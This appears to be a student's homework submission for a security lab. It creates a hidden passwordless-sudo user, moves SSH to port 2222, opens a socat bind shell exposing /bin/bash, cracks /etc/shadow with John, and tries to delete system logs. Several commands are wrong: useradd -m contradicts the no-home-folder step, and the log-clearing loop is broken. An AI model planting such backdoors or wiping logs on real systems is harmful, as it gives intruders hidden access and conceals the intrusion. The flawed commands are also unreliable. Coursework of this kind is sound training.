## Submission for Unit 6 Advanced Bash Homework

Create a secret user named `sysd`. Make sure this user doesn't have a home folder created.
- `root:home\ $ useradd -m sysd`

Give your secret user a password. 
- `$ passwd sysd`

Give your secret user a system UID < 1000.
- `usermod -u 898 sysd`

Give your secret user the same GID
- `groupmod -g 898 sysd` 

Give your secret user full sudo access without the need for a password.
- `sudo visudo` 

Test that sudo access works without your password

```bash
sysd ALL=(ALL) NOPASSWD:ALL
``` 

## Allow ssh access over port 2222.

```bash
Port 2222
``` 

Note the IP address of this system:
- `192.168.1.105`
Exit the root accout.
- `exit`
SSH to the machine using your sysd account and port 2222
- `ssh sysd@192.168.1.105 -p 2222`
Use sudo to switch to the root user
- `sudo -s`

### Create a backdoor with socat
- Install socat
  - `sudo apt install socat -y`
- Run Socat command in the background
  - `socat TCP4-Listen:3177,fork EXEC:/bin/bash`
- Explain each part of the `socat` command:
  - `socat` uses socat command to connect with second backdoor  
  - `TCP4-Listen:3177` allows to listent to other location in the VM
  - `EXEC:/bin/bash` execute the shell command on remote server
- Exit the SSH session
  - `exit`
- Test socat connection from your local machine
  - `socat STDIO TCP4:192.168.1.105:3177 `
- Close the `socat` connection.
  - `exit`

## Crack _all_ the passwords
Ssh back to the system using your sysd account
- `ssh sysd@192.168.1.105 -p 2222`
- Use John to crack the entire /etc/shadow file
    - `john /etc/shadow`

## Cover your tracks
- Use socat and a for loop to clear all system logs.
- `socat for log.txt in /var/log/syslog
do
	rm*
done` 